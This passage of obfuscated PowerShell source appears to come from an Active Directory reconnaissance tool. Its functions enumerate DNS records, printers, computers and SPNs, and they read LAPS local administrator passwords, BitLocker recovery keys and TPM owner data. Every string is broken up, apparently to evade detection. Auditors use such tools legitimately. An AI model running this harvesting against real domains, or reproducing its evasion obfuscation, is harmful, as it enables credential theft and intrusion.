                    $Obj | Add-Member -MemberType ("{1}{3}{2}{0}"-f 'erty','Note','p','Pro') -Name ("{0}{1}{2}"-f 'R','ecordC','ount') -Value $($DNSNodes | Measure-Object | Select-Object -ExpandProperty ("{0}{1}" -f'Cou','nt'))
                    $DNSNodes | ForEach-Object {
                        $ObjNode = New-Object ("{2}{1}{0}"-f 't','SObjec','P')
                        $ObjNode | Add-Member -MemberType ("{3}{1}{0}{2}"-f'p','o','erty','NotePr') -Name ("{2}{0}{1}"-f'ne','Name','Zo') -Value $Obj."N`AME"
                        $name = ([string] $($_."pro`pE`RTi`Es"."na`mE"))
                        If (-Not $name)
                        {
                            $name = ([string] $($_."prOPe`R`TIes"."D`c"))
                        }
                        $ObjNode | Add-Member -MemberType ("{0}{1}{3}{2}" -f 'N','otePr','y','opert') -Name ("{1}{0}"-f 'e','Nam') -Value $name
                        Try
                        {
                            $DNSRecord = Convert-DNSRecord $_."P`Ro`PertIeS"."D`NsR`EcoRd"[0]
                        }
                        Catch
                        {
                            Write-Warning ("{4}{6}{0}{2}{5}{1}{7}{8}{3}{9}" -f 't-ADRDNSZone',' while co','] E',' the DNSR','[','rror','Ge','nvertin','g','ecord')
                            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                        }
                        $ObjNode | Add-Member -MemberType ("{0}{1}{2}{3}"-f'NotePr','op','e','rty') -Name ("{1}{0}{3}{2}" -f'rd','Reco','ype','T') -Value $DNSRecord."re`coRDt`Ype"
                        $ObjNode | Add-Member -MemberType ("{2}{0}{1}" -f'oteProp','erty','N') -Name ("{1}{0}" -f'ta','Da') -Value $DNSRecord."da`TA"
                        $ObjNode | Add-Member -MemberType ("{0}{1}{3}{2}" -f 'N','otePr','perty','o') -Name ("{1}{0}" -f'TL','T') -Value $DNSRecord."t`TL"
                        $ObjNode | Add-Member -MemberType ("{1}{3}{2}{0}" -f'y','Not','Propert','e') -Name ("{1}{0}" -f'ge','A') -Value $DNSRecord."A`GE"
                        $ObjNode | Add-Member -MemberType ("{3}{0}{1}{2}" -f't','eProper','ty','No') -Name ("{1}{0}" -f 'imeStamp','T') -Value $DNSRecord."t`im`ESTAMP"
                        $ObjNode | Add-Member -MemberType ("{1}{0}{2}" -f 'ote','N','Property') -Name ("{1}{0}{3}{2}"-f'at','Upd','l','edAtSeria') -Value $DNSRecord."U`PdaTEd`AtSE`RiaL"
                        $ObjNode | Add-Member -MemberType ("{3}{1}{2}{0}"-f'operty','t','ePr','No') -Name ("{3}{0}{2}{1}"-f'e','ted','nCrea','wh') -Value ([DateTime] $($_."pr`O`PERTies"."Wh`enCrE`At`eD"))
                        $ObjNode | Add-Member -MemberType ("{0}{1}{2}"-f 'NotePr','opert','y') -Name ("{1}{2}{0}{3}"-f 'ng','whenCh','a','ed') -Value ([DateTime] $($_."p`ROP`ErtIes"."Whenc`H`An`gEd"))
                        
                        
                        
                        $ObjNode | Add-Member -MemberType ("{1}{2}{0}" -f 'ty','NotePrope','r') -Name ("{2}{1}{4}{3}{0}{5}"-f'On','InAdvancedVi','show','w','e','ly') -Value ([string] $($_."PR`oP`ER`Ties"."s`hOW`iNAD`VAN`CEdviEWOnly"))
                        $ObjNode | Add-Member -MemberType ("{3}{0}{1}{2}"-f'e','P','roperty','Not') -Name ("{1}{4}{2}{3}{0}"-f 'dName','Disti','is','he','ngu') -Value ([string] $($_."P`RopE`RtIES"."Di`sti`N`gu`iSHE`DName"))
                        $ADDNSNodesObj += $ObjNode
                        If ($DNSRecord)
                        {
                            Remove-Variable ("{1}{0}{2}"-f 'Reco','DNS','rd')
                        }
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType ("{1}{3}{2}{0}"-f'rty','No','pe','tePro') -Name ("{0}{3}{2}{1}" -f'Reco','t','n','rdCou') -Value $null
                }
                $Obj | Add-Member -MemberType ("{2}{1}{0}{3}" -f'ope','Pr','Note','rty') -Name ("{1}{0}{2}" -f 'reat','USNC','ed') -Value ([string] $($_."Pr`op`erTIes"."uSnCR`Eat`eD"))
                $Obj | Add-Member -MemberType ("{0}{1}{2}"-f 'NoteP','roper','ty') -Name ("{1}{2}{0}"-f'hanged','US','NC') -Value ([string] $($_."p`ROPerti`eS"."usNc`Han`g`Ed"))
                $Obj | Add-Member -MemberType ("{2}{0}{1}{3}" -f 'e','rt','NoteProp','y') -Name ("{3}{1}{2}{0}" -f 'reated','hen','C','w') -Value ([DateTime] $($_."pRo`PE`RtIeS"."W`hEN`Cr`eATed"))
                $Obj | Add-Member -MemberType ("{2}{0}{3}{1}" -f 'r','rty','NoteP','ope') -Name ("{1}{2}{0}" -f 'ed','wh','enChang') -Value ([DateTime] $($_."pROp`e`RTIeS"."w`HeNc`HAngEd"))
                $Obj | Add-Member -MemberType ("{2}{0}{1}"-f 'rt','y','NotePrope') -Name ("{3}{2}{0}{4}{1}" -f 's','e','tingui','Dis','hedNam') -Value ([string] $($_."PRo`PER`TI`ES"."DiS`TIN`gui`sh`edNA`Me"))
                $ADDNSZonesObj += $Obj
            }
            Write-Verbose "[*] Total DNS Records: $([ADRecon.LDAPClass]::ObjectCount($ADDNSNodesObj)) "
            Remove-Variable ("{1}{2}{0}{3}" -f'Zon','DN','S','eArray')
        }
    }

    If ($ADDNSZonesObj -and $ADRDNSZones)
    {
        Export-ADR $ADDNSZonesObj $ADROutputDir $OutputType ("{2}{0}{1}"-f 'Zo','nes','DNS')
        Remove-Variable ("{2}{1}{0}{3}" -f 'onesOb','SZ','ADDN','j')
    }

    If ($ADDNSNodesObj -and $ADRDNSRecords)
    {
        Export-ADR $ADDNSNodesObj $ADROutputDir $OutputType ("{0}{1}{2}"-f 'D','NS','Nodes')
        Remove-Variable ("{0}{1}{2}{3}"-f 'ADDNSN','od','esO','bj')
    }
}

Function ge`T`-`AD`RpRiNtEr
{


    param(
        [Parameter(mANDAtORY = $true)]
        [string] $Method,

        [Parameter(ManDaTory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANdatorY = $true)]
        [int] $PageSize,

        [Parameter(MaNdatOrY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            $ADPrinters = @( Get-ADObject -LDAPFilter (("{3}{1}{2}{4}{0}"-f'ue)','c','tCategory=print','(obje','Que')) -Properties ("{2}{0}{1}"-f 'rN','ame','drive'),("{1}{3}{2}{0}" -f'n','driver','rsio','Ve'),("{0}{1}"-f 'N','ame'),("{1}{0}{2}"-f 'rt','po','Name'),("{1}{3}{2}{4}{0}" -f 'me','pr','t','in','ShareNa'),("{1}{3}{0}{2}"-f 'Nam','se','e','rver'),("{1}{0}"-f'l','ur'),("{3}{1}{0}{2}" -f 'n','nCha','ged','whe'),("{2}{0}{1}"-f 'en','Created','wh') )
        }
        Catch
        {
            Write-Warning ("{13}{1}{10}{8}{5}{11}{6}{4}{9}{15}{7}{16}{14}{2}{3}{12}{0}" -f 'ects','DRPri',' O','b','erat','ile ','um','g print','h','i','nter] Error w','en','j','[Get-A','ueue','n','Q')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADPrinters)
        {
            Write-Verbose "[*] Total Printers: $([ADRecon.ADWSClass]::ObjectCount($ADPrinters)) "
            $PrintersObj =  $jWb18::("{3}{2}{1}{0}" -f 'erParser','t','n','Pri').Invoke($ADPrinters, $Threads)
            Remove-Variable ("{1}{0}{2}" -f'te','ADPrin','rs')
        }
    }

    If ($Method -eq ("{1}{0}"-f'AP','LD'))
    {
        $objSearcher = New-Object ("{3}{5}{4}{7}{8}{2}{1}{6}{9}{0}{10}"-f'Se','ervices','yS','Sy','m.Dir','ste','.Directo','ect','or','ry','archer') $objDomain
        $ObjSearcher."PaGe`s`iZE" = $PageSize
        $ObjSearcher."FIl`TeR" = ("{2}{0}{4}{1}{7}{6}{5}{3}"-f'Categ','prin','(object',')','ory=','eue','Qu','t')
        $ObjSearcher."s`eA`R`cHScopE" = ("{1}{0}" -f'ree','Subt')

        Try
        {
            $ADPrinters = $ObjSearcher.("{2}{1}{0}"-f'All','ind','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{0}{1}{6}{11}{14}{8}{3}{10}{13}{5}{7}{12}{4}{15}{2}{16}{9}"-f'[','Get-','in','or ','ting p','le','ADRPrin',' enume','r',' Objects','w','ter]','ra','hi',' Er','r','tQueue')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}{2}"-f 'ispos','d','e').Invoke()

        If ($ADPrinters)
        {
            $cnt = $( (  GCI variAbLe:s07D ).VaLUe::("{1}{0}{2}"-f 't','Objec','Count').Invoke($ADPrinters))
            If ($cnt -ge 1)
            {
                Write-Verbose ('['+'*] '+'To'+'tal '+'Pr'+'in'+'ters: '+"$cnt")
                $PrintersObj =  $S07D::("{2}{0}{3}{1}"-f'nte','rser','Pri','rPa').Invoke($ADPrinters, $Threads)
            }
            Remove-Variable ("{3}{0}{1}{2}" -f 'inte','r','s','ADPr')
        }
    }

    If ($PrintersObj)
    {
        Return $PrintersObj
    }
    Else
    {
        Return $null
    }
}

Function Ge`T-A`D`RCOmpUTER
{

    param(
        [Parameter(ManDAtORy = $true)]
        [string] $Method,

        [Parameter(MaNDatOrY = $true)]
        [DateTime] $date,

        [Parameter(MANDaTORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MandatORY = $true)]
        [int] $DormantTimeSpan = 90,

        [Parameter(manDatory = $true)]
        [int] $PassMaxAge = 30,

        [Parameter(maNdATOrY = $true)]
        [int] $PageSize,

        [Parameter(mAnDAToRY = $false)]
        [int] $Threads = 10,

        [Parameter(MandatORY = $false)]
        [int] $ADRComputers = $true,

        [Parameter(mAndaTOry = $false)]
        [int] $ADRComputerSPNs = $false
    )

    If ($Method -eq ("{0}{1}" -f'A','DWS'))
    {
        If (!$ADRComputers)
        {
            Try
            {
                $ADComputers = @( Get-ADObject -LDAPFilter ((("{10}{2}{11}{5}{3}{9}{7}{6}{12}{4}{8}{15}{14}{1}{13}{0}"-f'=*))','incipal','(samAccoun','=',')','pe','3','6','(servic','80530','(&','tTy','69','Name','Pr','e'))) -ResultPageSize $PageSize -Properties ("{1}{0}"-f'me','Na'),("{4}{1}{2}{0}{3}" -f'incip','r','vicePr','alName','se') )
            }
            Catch
            {
                Write-Warning ("{7}{13}{12}{5}{1}{0}{11}{4}{8}{14}{6}{10}{3}{2}{9}"-f'ter] Err','mpu','ute','ing Comp','r wh','-ADRCo','a','[','ile enum','rSPN Objects','t','o','t','Ge','er')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Try
            {
                $ADComputers = @( Get-ADComputer -Filter * -ResultPageSize $PageSize -Properties ("{1}{0}{2}{3}"-f'i','Descr','ptio','n'),("{2}{3}{5}{0}{1}{4}" -f 'tingu','ishe','D','i','dName','s'),("{0}{1}{2}" -f 'DNSH','os','tName'),("{0}{2}{1}"-f 'Ena','ed','bl'),("{2}{3}{1}{0}"-f'ss','dre','IPv','4Ad'),("{0}{2}{1}{3}"-f 'Las','ogon','tL','Date'),("{2}{1}{3}{0}{4}{5}"-f 'T','DS-A','ms','llowed','oDeleg','ateTo'),("{1}{3}{0}{4}{2}" -f 'reato','m','id','s-ds-C','rS'),("{4}{0}{6}{2}{3}{5}{1}"-f'sD','pes','ortedE','ncrypti','m','onTy','S-Supp'),("{1}{0}" -f 'e','Nam'),("{3}{1}{2}{0}"-f 'System','a','ting','Oper'),("{3}{0}{2}{1}{4}" -f 'r','Sys','ating','Ope','temHotfix'),("{2}{0}{1}{4}{3}{5}" -f'ratingSyst','emSer','Ope','c','vi','ePack'),("{0}{1}{4}{5}{6}{2}{3}"-f'Operat','in','o','n','gSystemVer','s','i'),("{2}{0}{3}{4}{1}" -f'wor','et','Pass','dLa','stS'),("{2}{1}{4}{0}{3}"-f'I','ry','prima','D','Group'),("{4}{1}{0}{2}{3}"-f 'AccountN','am','am','e','S'),("{0}{5}{3}{4}{1}{2}"-f 'servic','palNam','e','r','inci','eP'),("{0}{1}"-f'S','ID'),("{0}{1}{3}{2}" -f'S','IDH','ory','ist'),("{4}{0}{2}{3}{1}" -f 'stedFor','gation','Del','e','Tru'),("{4}{6}{0}{3}{2}{5}{1}"-f'd','ion','rDeleg','ToAuthFo','Trus','at','te'),("{4}{1}{3}{2}{0}"-f 'untControl','r','co','Ac','Use'),("{2}{0}{1}" -f'Change','d','when'),("{2}{0}{1}" -f 'henCr','eated','w') )
            }
            Catch
            {
                Write-Warning ("{8}{2}{3}{4}{6}{5}{0}{7}{1}{9}"-f 'g Co','ter Obj','e','r] Erro','r whil','atin','e enumer','mpu','[Get-ADRComput','ects')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }
        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj =   $jWB18::("{2}{1}{3}{0}"-f'er','puterP','Com','ars').Invoke($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj =  (VaRIAbLE  jwb18  ).VaLue::("{4}{5}{3}{2}{0}{1}" -f 'Parse','r','PN','rS','C','ompute').Invoke($ADComputers, $Threads)
            }
            Remove-Variable ("{2}{0}{1}"-f 'Comp','uters','AD')
        }
    }

    If ($Method -eq ("{0}{1}" -f'LDA','P'))
    {
        If (!$ADRComputers)
        {
            $objSearcher = New-Object ("{2}{6}{0}{5}{1}{4}{8}{7}{3}"-f 'm.Direc','ySe','Sys','er','rvices.Di','tor','te','ctorySearch','re') $objDomain
            $ObjSearcher."PAg`e`size" = $PageSize
            $ObjSearcher."Fi`LteR" = ((("{12}{0}{8}{4}{10}{5}{1}{14}{11}{15}{9}{3}{13}{2}{6}{7}"-f'(','53','a','icePrinci','mAcc','ntType=80','me=*','))','sa','erv','ou','69)(','(&','palN','063','s')))
            $ObjSearcher."pROp`ErTiE`sToL`oAd".("{0}{1}" -f 'Add','Range').Invoke((("{1}{0}" -f'me','na'),("{3}{2}{1}{0}{4}" -f 'a','n','incipal','servicepr','me')))
            $ObjSearcher."S`E`ARCHsC`oPE" = ("{0}{1}{2}" -f'Subtr','e','e')
            Try
            {
                $ADComputers = $ObjSearcher.("{1}{0}{2}"-f 'indA','F','ll').Invoke()
            }
            Catch
            {
                Write-Warning ("{12}{3}{10}{6}{11}{7}{0}{9}{5}{8}{14}{13}{1}{2}{4}" -f '] Er','b','jec','Get','ts','enumerating ','DRC','er','Comp','ror while ','-A','omput','[',' O','uterSPN')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{2}{1}{0}"-f'se','o','disp').Invoke()
        }
        Else
        {
            $objSearcher = New-Object ("{9}{2}{8}{6}{3}{0}{1}{7}{5}{4}"-f 'vices.Di','rect','tem','Ser','earcher','S','ectory','ory','.Dir','Sys') $objDomain
            $ObjSearcher."PAG`eS`iZe" = $PageSize
            $ObjSearcher."fI`Lt`Er" = (("{7}{6}{0}{2}{4}{3}{1}{5}" -f'amA','6','cco','e=80530','untTyp','369)','s','('))
            $ObjSearcher."PRope`RtI`esTO`l`oaD".("{0}{2}{1}" -f 'Ad','nge','dRa').Invoke((("{0}{1}{3}{2}" -f 'desc','ri','tion','p'),("{3}{1}{2}{0}{4}"-f'uished','isti','ng','d','name'),("{2}{3}{0}{1}"-f 'st','name','dns','ho'),("{2}{3}{5}{4}{1}{0}"-f'mp','a','last','l','gontimest','o'),("{3}{5}{6}{2}{4}{0}{1}" -f'g','ateTo','oDe','m','le','sDS-All','owedT'),("{0}{1}{2}{3}" -f'ms','-ds-Cre','a','torSid'),("{1}{4}{0}{5}{2}{3}"-f'Su','ms','io','nTypes','DS-','pportedEncrypt'),("{1}{0}"-f'me','na'),("{2}{1}{0}"-f 'id','s','object'),("{3}{4}{2}{0}{1}"-f'sy','stem','ing','opera','t'),("{1}{3}{2}{0}"-f 'tfix','operati','ystemho','ngs'),("{4}{7}{2}{6}{3}{5}{0}{1}" -f 'rvic','epack','ting','tems','oper','e','sys','a'),("{0}{1}{4}{3}{2}"-f'o','p','version','atingsystem','er'),("{1}{0}{2}"-f'marygroup','pri','id'),("{2}{0}{1}" -f 'ts','et','pwdlas'),("{0}{1}{2}{3}"-f'sama','cco','untnam','e'),("{5}{0}{3}{4}{2}{1}" -f'i','e','am','pa','ln','serviceprinc'),("{2}{0}{1}" -f'tor','y','sidhis'),("{3}{1}{0}{2}"-f'ntcont','accou','rol','user'),("{3}{2}{1}{0}" -f'd','ge','n','whencha'),("{1}{3}{0}{2}" -f'e','w','ated','hencr')))
            $ObjSearcher."searc`HS`COPe" = ("{1}{0}" -f 'ee','Subtr')

            Try
            {
                $ADComputers = $ObjSearcher.("{0}{1}{2}"-f 'Fi','ndA','ll').Invoke()
            }
            Catch
            {
                Write-Warning ("{5}{8}{13}{0}{6}{3}{4}{11}{12}{7}{1}{9}{10}{2}" -f'ter] Err','te','jects','umerati','ng ','[Get-AD','or while en','u','RCom','r',' Ob','Com','p','pu')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            $ObjSearcher.("{0}{2}{1}" -f 'dis','se','po').Invoke()
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total Computers: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
            If ($ADRComputers)
            {
                $ComputerObj =   (GI VAriabLe:s07D).vALUe::("{2}{0}{1}" -f'omputerPar','ser','C').Invoke($ADComputers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRComputerSPNs)
            {
                $ComputerSPNObj =   (  GcI VaRIabLe:S07d).value::("{0}{1}{4}{3}{2}"-f'Comput','erS','rser','a','PNP').Invoke($ADComputers, $Threads)
            }
            Remove-Variable ("{2}{1}{0}" -f 'rs','ute','ADComp')
        }
    }

    If ($ComputerObj)
    {
        Export-ADR -ADRObj $ComputerObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{2}{1}{0}"-f'ers','ut','Comp')
        Remove-Variable ("{2}{1}{0}" -f 'j','Ob','Computer')
    }
    If ($ComputerSPNObj)
    {
        Export-ADR -ADRObj $ComputerSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{3}{2}{0}" -f 'rSPNs','Co','te','mpu')
        Remove-Variable ("{0}{3}{2}{1}" -f'Comp','j','b','uterSPNO')
    }
}


Function ge`T-A`DRlapSC`HEck
{

    param(
        [Parameter(MANdaToRY = $true)]
        [string] $Method,

        [Parameter(mAnDatOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAndaTORy = $true)]
        [int] $PageSize,

        [Parameter(MandAtorY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}" -f 'S','ADW'))
    {
        Try
        {
            $ADComputers = @( Get-ADObject -LDAPFilter (("{6}{3}{2}{5}{8}{7}{1}{4}{0}"-f '69)','0','ntTy','cou','63','pe=8','(samAc','53','0')) -Properties ('CN'),("{1}{0}{2}{3}"-f 'ostN','DNSH','a','me'),("{4}{3}{2}{0}{1}"-f '-AdmPw','d','s','-Mc','ms'),("{0}{4}{3}{2}{1}{6}{7}{5}"-f 'm','s-','c','M','s-','me','AdmPw','dExpirationTi') -ResultPageSize $PageSize )
        }
        Catch [System.ArgumentException]
        {
            Write-Warning ("{4}{3}{2}{1}{5}{0}" -f'nted.',' not',' is','LAPS','[*] ',' impleme')
            Return $null
        }
        Catch
        {
            Write-Warning ("{6}{4}{3}{12}{13}{2}{1}{10}{14}{0}{9}{15}{5}{8}{11}{7}" -f 'or wh','c','Che','t-','e','t','[G','PS Objects','ing','ile ','k] ',' LA','ADR','LAPS','Err','enumera')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADComputers)
        {
            Write-Verbose "[*] Total LAPS Objects: $([ADRecon.ADWSClass]::ObjectCount($ADComputers)) "
            $LAPSObj =   ( iTem ('vAr'+'Ia'+'BLe:J'+'wB18')  ).VAluE::("{2}{1}{0}" -f 'arser','SP','LAP').Invoke($ADComputers, $Threads)
            Remove-Variable ("{0}{2}{1}" -f'ADComp','ters','u')
        }
    }

    If ($Method -eq ("{1}{0}" -f'DAP','L'))
    {
        $objSearcher = New-Object ("{7}{1}{6}{5}{9}{3}{4}{2}{8}{0}"-f 'earcher','ys','ectory','es.','Dir','em.','t','S','S','DirectoryServic') $objDomain
        $ObjSearcher."pAGE`s`izE" = $PageSize
        $ObjSearcher."fI`lTeR" = (("{5}{1}{3}{0}{4}{2}" -f'nt','co','ype=805306369)','u','T','(samAc'))
        $ObjSearcher."pR`o`PErtieSTo`LO`AD".("{0}{2}{1}"-f'A','nge','ddRa').Invoke(("cn",("{2}{3}{0}{1}" -f'st','name','dns','ho'),("{0}{2}{1}" -f 'ms-mcs','mpwd','-ad'),("{2}{0}{3}{1}{4}" -f 'mcs','ationti','ms-','-admpwdexpir','me')))
        $ObjSearcher."s`EARCHSC`oPE" = ("{0}{2}{1}" -f 'Su','ee','btr')
        Try
        {
            $ADComputers = $ObjSearcher.("{1}{0}{2}" -f'indA','F','ll').Invoke()
        }
        Catch
        {
            Write-Warning ("{13}{1}{9}{5}{11}{10}{3}{12}{4}{7}{6}{0}{2}{8}"-f ' O','Get-ADRLAP','bje',' whil','erati','Chec','APS','ng L','cts','S','Error','k] ','e enum','[')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}" -f'se','dispo').Invoke()

        If ($ADComputers)
        {
            $LAPSCheck =   (gci  VARIaBLE:s07D  ).vALUE::("{1}{0}{2}{3}"-f 'C','LAPS','he','ck').Invoke($ADComputers)
            If (-Not $LAPSCheck)
            {
                Write-Warning ("{1}{5}{0}{3}{2}{4}"-f ' LAPS is not ','[*','mpl','i','emented.',']')
                Return $null
            }
            Else
            {
                Write-Verbose "[*] Total LAPS Objects: $([ADRecon.LDAPClass]::ObjectCount($ADComputers)) "
                $LAPSObj =  ( ls ('VA'+'Riab'+'le:S07'+'d')).vALUe::("{0}{1}{2}" -f'L','A','PSParser').Invoke($ADComputers, $Threads)
                Remove-Variable ("{2}{1}{0}" -f 'ers','Comput','AD')
            }
        }
    }

    If ($LAPSObj)
    {
        Return $LAPSObj
    }
    Else
    {
        Return $null
    }
}

Function G`E`T-adrbiT`Lo`cKer
{

    param(
        [Parameter(mAndAtOrY = $true)]
        [string] $Method,

        [Parameter(MAnDatORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(ManDATory = $false)]
        [string] $DomainController,

        [Parameter(maNdatOry = $false)]
        [Management.Automation.PSCredential] $Credential =  (iteM vAriAbLe:k49P ).VaLue::"EM`pty"
    )

    If ($Method -eq ("{1}{0}" -f 'S','ADW'))
    {
        Try
        {
            $ADBitLockerRecoveryKeys = Get-ADObject -LDAPFilter (("{7}{2}{8}{6}{4}{0}{5}{3}{1}"-f'm',')','bj','ion','yInfor','at','ass=msFVE-Recover','(o','ectCl')) -Properties ("{1}{0}{2}{3}{4}{5}" -f 'sti','di','nguis','he','dN','ame'),("{3}{2}{0}{1}{4}{5}"-f'e','coveryPa','FVE-R','ms','sswo','rd'),("{4}{0}{1}{2}{5}{3}"-f'sFVE-Re','cover','y','uid','m','G'),("{2}{3}{0}{1}"-f'E-VolumeG','uid','m','sFV'),("{0}{1}" -f'Na','me'),("{2}{1}{0}"-f'ed','nCreat','whe')
        }
        Catch
        {
            Write-Warning ("{12}{4}{5}{9}{7}{2}{1}{10}{6}{3}{0}{8}{13}{11}"-f 'ation','ng msFVE-Rec','erati','Inform','-ADRBi','tLocker','ry','rror while enum',' O','] E','ove','ts','[Get','bjec')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADBitLockerRecoveryKeys)
        {
            $cnt = $(  (  gEt-iTeM  VARiABLE:jwB18 ).VALue::("{1}{2}{0}{3}" -f'C','Ob','ject','ount').Invoke($ADBitLockerRecoveryKeys))
            If ($cnt -ge 1)
            {
                Write-Verbose ('[*]'+' '+'Total'+' '+'B'+'itL'+'ocker '+'Rec'+'o'+'very '+'Keys:'+' '+"$cnt")
                $BitLockerObj = @()
                $ADBitLockerRecoveryKeys | ForEach-Object {
                    
                    $Obj = New-Object ("{2}{1}{0}"-f'ct','SObje','P')
                    $Obj | Add-Member -MemberType ("{0}{2}{1}{3}"-f'Note','pert','Pro','y') -Name ("{1}{0}{3}{2}" -f 'sting','Di','ished Name','u') -Value $((($_."distiNGu`i`Sh`EDn`AME" -split '}')[1]).("{1}{0}{2}"-f'stri','sub','ng').Invoke(1))
                    $Obj | Add-Member -MemberType ("{0}{2}{1}{3}"-f'Note','o','Pr','perty') -Name ("{1}{0}" -f'ame','N') -Value $_."NA`mE"
                    $Obj | Add-Member -MemberType ("{0}{2}{1}"-f 'NotePr','rty','ope') -Name ("{1}{0}{2}" -f'ate','whenCre','d') -Value $_."wHEnCr`EaT`eD"
                    $Obj | Add-Member -MemberType ("{2}{0}{1}{3}"-f 'ePrope','rt','Not','y') -Name ("{0}{2}{3}{1}"-f'Rec',' ID','over','y Key') -Value $([GUID] $_.'msFVE-RecoveryGuid')
                    $Obj | Add-Member -MemberType ("{0}{2}{1}" -f'NoteProp','rty','e') -Name ("{2}{0}{1}{3}"-f'r','y Ke','Recove','y') -Value $_.'msFVE-RecoveryPassword'
                    $Obj | Add-Member -MemberType ("{0}{1}{2}"-f 'NotePro','pert','y') -Name ("{1}{2}{0}"-f'GUID','V','olume ') -Value $([GUID] $_.'msFVE-VolumeGuid')
                    Try
                    {
                        $TempComp = Get-ADComputer -Identity $Obj.'Distinguished Name' -Properties ("{1}{0}{5}{4}{2}{3}{6}"-f 'PM','msT','rma','tio','wnerInfo','-O','n'),("{2}{6}{4}{3}{7}{0}{5}{1}" -f 'omp','ter','m','pmInformationF','TPM-T','u','s','orC')
                    }
                    Catch
                    {
                        Write-Warning "[Get-ADRBitLocker] Error while enumerating $($Obj.'Distinguished Name') Computer Object "
                        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    }
                    If ($TempComp)
                    {
                        
                        $Obj | Add-Member -MemberType ("{3}{0}{1}{2}"-f 'Pro','per','ty','Note') -Name ("{5}{0}{2}{1}{4}{3}"-f'sTPM-Ow','for','nerIn','tion','ma','m') -Value $TempComp.'msTPM-OwnerInformation'

                        
                        $Obj | Add-Member -MemberType ("{2}{1}{0}"-f'y','otePropert','N') -Name ("{1}{3}{2}{0}{4}{8}{6}{7}{5}" -f 'Info','m','-Tpm','sTPM','r','nForComputer','ti','o','ma') -Value $TempComp.'msTPM-TpmInformationForComputer'
                        If ($null -ne $TempComp.'msTPM-TpmInformationForComputer')
                        {
                            
                            $TPMObject = Get-ADObject -Identity $TempComp.'msTPM-TpmInformationForComputer' -Properties ("{1}{6}{2}{4}{0}{5}{3}"-f'for','m','TPM-Owner','ion','In','mat','s')
                            $TPMRecoveryInfo = $TPMObject.'msTPM-OwnerInformation'
                        }
                        Else
                        {
                            $TPMRecoveryInfo = $null
                        }
                    }
                    Else
                    {
                        $Obj | Add-Member -MemberType ("{3}{1}{2}{0}" -f'rty','tePr','ope','No') -Name ("{4}{0}{2}{1}{6}{3}{5}"-f 'P','OwnerIn','M-','ormatio','msT','n','f') -Value $null
                        $Obj | Add-Member -MemberType ("{2}{1}{0}{3}" -f'eProper','t','No','ty') -Name ("{7}{1}{6}{4}{3}{0}{8}{2}{5}{9}"-f 'ati','T','om','Inform','M-Tpm','pu','P','ms','onForC','ter') -Value $null
                        $TPMRecoveryInfo = $null

                    }
                    $Obj | Add-Member -MemberType ("{2}{0}{3}{1}"-f'otePr','rty','N','ope') -Name ("{4}{3}{5}{1}{0}{2}" -f 'r','sswo','d','M','TP',' Owner Pa') -Value $TPMRecoveryInfo
                    $BitLockerObj += $Obj
                }
            }
            Remove-Variable ("{1}{2}{3}{7}{4}{6}{5}{0}" -f 'yKeys','ADB','i','tL','R','ver','eco','ocker')
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LD','AP'))
    {
        $objSearcher = New-Object ("{1}{3}{8}{7}{0}{5}{6}{2}{10}{4}{9}" -f'c','S','Services.Dir','ystem.D','che','tor','y','e','ir','r','ectorySear') $objDomain
        $ObjSearcher."pA`geS`IZE" = $PageSize
        $ObjSearcher."F`I`lTER" = ("{5}{0}{7}{4}{8}{3}{9}{2}{1}{6}" -f'ctCl','yInf','Recover','VE','ss=','(obje','ormation)','a','msF','-')
        $ObjSearcher."pR`op`eRTIe`sToL`oAd".("{2}{0}{1}"-f'ng','e','AddRa').Invoke((("{3}{2}{1}{0}"-f'Name','shed','i','distingu'),("{3}{4}{2}{0}{1}" -f '-recoverypass','word','fve','m','s'),("{1}{3}{2}{0}"-f'uid','msf','-recoveryg','ve'),("{2}{0}{3}{1}" -f'sfve-volum','id','m','egu'),("{0}{1}{2}{4}{3}"-f 'mstpm','-o','w','information','ner'),("{6}{2}{3}{4}{1}{5}{0}"-f'uter','for','-tpmin','format','ion','comp','mstpm'),("{1}{0}"-f'e','nam'),("{3}{0}{2}{1}"-f't','d','e','whencrea')))
        $ObjSearcher."S`eA`RchSC`OPe" = ("{2}{1}{0}" -f 'e','re','Subt')

        Try
        {
            $ADBitLockerRecoveryKeys = $ObjSearcher.("{0}{1}{2}"-f 'FindA','l','l').Invoke()
        }
        Catch
        {
